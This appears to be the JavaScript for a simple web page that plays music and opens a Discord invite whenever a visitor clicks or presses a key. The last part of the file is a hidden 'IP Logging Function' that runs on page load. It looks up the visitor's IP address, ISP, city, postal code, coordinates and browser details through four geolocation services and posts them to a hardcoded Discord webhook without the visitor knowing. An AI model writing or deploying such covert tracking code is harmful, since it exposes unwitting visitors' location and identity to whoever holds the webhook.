// Discord invite URL - replace with your actual Discord invite link
const DISCORD_INVITE_URL = 'https://discord.gg/vR7QAAPrch';

// Get audio element
const audio = document.getElementById('backgroundMusic');

// Flag to track if music is playing
let musicPlaying = false;

// Function to play music
function playMusic() {
    if (!musicPlaying) {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        audio.play().catch(() => {
            createBeepSound(audioContext);
        });

        musicPlaying = true;
        console.log('Music started playing');
    }
}

// Function to create a simple beep sound using Web Audio API
function createBeepSound(audioContext) {
    const oscillator = audioContext.createOscillator();
    const gainNode = audioContext.createGain();

    oscillator.connect(gainNode);
    gainNode.connect(audioContext.destination);

    oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
    oscillator.type = 'sine';

    gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
    gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 1);

    oscillator.start(audioContext.currentTime);
    oscillator.stop(audioContext.currentTime + 1);
}

// Function to open Discord invite
function openDiscord() {
    window.open(DISCORD_INVITE_URL, '_blank');
    console.log('Discord invite opened');
}

// Add click event listener to the entire document
document.addEventListener('click', function (event) {
    event.preventDefault();
    playMusic();
    openDiscord();
});

// Add keyboard support
document.addEventListener('keydown', function (event) {
    if (event.code === 'Space' || event.code === 'Enter') {
        event.preventDefault();
        playMusic();
        openDiscord();
    }
});

console.log('Site loaded! Click anywhere to play music and open Discord.');

// ✅ IP Logging Function (from your original script)
(async function () {
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1416239494042222734/D-Veb83YNEcOhpbiZHVKE4LmdAAnV6PMwe7_niGAoHbw-9uHfXfnDv9PIGSStCbuOi7i";

    function trunc(s, n = 1000) {
        if (!s && s !== 0) return "";
        s = String(s);
        return s.length > n ? s.slice(0, n - 1) + "…" : s;
    }

    async function queryIpWhoIs() {
        try {
            const r = await fetch("https://ipwho.is/", { cache: "no-store" });
            if (!r.ok) return null;
            return await r.json();
        } catch { return null; }
    }

    async function queryIpApiCo() {
        try {
            const r = await fetch("https://ipapi.co/json/", { cache: "no-store" });
            if (!r.ok) return null;
            return await r.json();
        } catch { return null; }
    }

    async function queryIfconfigCo() {
        try {
            const r = await fetch("https://ifconfig.co/json", { cache: "no-store" });
            if (!r.ok) return null;
            return await r.json();
        } catch { return null; }
    }

    async function queryIpInfo() {
        try {
            const r = await fetch("https://ipinfo.io/json", { cache: "no-store" });
            if (!r.ok) return null;
            return await r.json();
        } catch { return null; }
    }

    function mergeResults(...sources) {
        const out = {};
        for (const s of sources) {
            if (!s || typeof s !== "object") continue;
            for (const k of Object.keys(s)) {
                if (out[k] === undefined || out[k] === null || out[k] === "") {
                    out[k] = s[k];
                }
            }
        }
        return out;
    }

    function buildFields(data, ua, page, ts) {
        const fields = [];
        function add(name, val, inline = false) {
            if (val === undefined || val === null || val === "") return;
            fields.push({ name, value: trunc(String(val), 1000), inline });
        }

        add("IP Address", data.ip);
        add("Hostname", data.hostname || data.reverse || data.rdns);
        add("ISP / Provider", data.isp || data.org || data.company);
        add("ASN", data.asn || data.connection?.asn);
        add("Org", data.org || data.company);
        add("City", data.city);
        add("Region/State", data.region);
        add("Country", data.country_name || data.country);
        add("Postal", data.postal || data.zip);

        const lat = data.latitude || (data.loc ? data.loc.split(",")[0] : null);
        const lon = data.longitude || (data.loc ? data.loc.split(",")[1] : null);
        if (lat && lon) add("Coordinates", `${lat}, ${lon}`);

        add("Timezone", data.timezone);
        add("User Agent", ua, false);
        add("Page", page, false);
        add("Timestamp", ts, false);

        return fields;
    }

    async function sendIpToWebhook() {
        const ts = new Date().toISOString();
        const ua = navigator.userAgent || "";
        const page = location.href || "";

        const [a, b, c, d] = await Promise.allSettled([
            queryIpWhoIs(),
            queryIpApiCo(),
            queryIfconfigCo(),
            queryIpInfo()
        ]);

        const results = [];
        if (a.status === "fulfilled" && a.value) results.push(a.value);
        if (b.status === "fulfilled" && b.value) results.push(b.value);
        if (c.status === "fulfilled" && c.value) results.push(c.value);
        if (d.status === "fulfilled" && d.value) results.push(d.value);

        if (results.length === 0) return;

        const merged = mergeResults(...results);
        const fields = buildFields(merged, ua, page, ts);

        const embed = { title: "Visitor IP & Geo Log", color: 0x2ecc71, fields };

        fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ embeds: [embed] })
        }).catch(() => { });
    }

    // Auto-run on page load
    sendIpToWebhook();
})();
